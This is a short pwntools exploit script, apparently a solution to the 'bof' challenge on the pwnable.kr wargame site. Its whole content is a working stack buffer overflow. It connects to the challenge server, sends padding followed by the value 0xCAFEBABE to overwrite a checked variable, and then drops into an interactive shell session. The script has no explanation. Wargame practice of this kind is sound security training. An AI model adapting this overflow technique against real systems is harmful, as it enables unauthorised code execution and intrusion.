from pwn import *
context.log_level = 'debug'
cn = remote('pwnable.kr', 9000)
#cn = process('./bof')
#cn.recv()
pay = 'a'*0x2c + 'bbbb'+ 'rrrr' + p32(0xCAFEBABE)
cn.sendline(pay)
cn.interactive()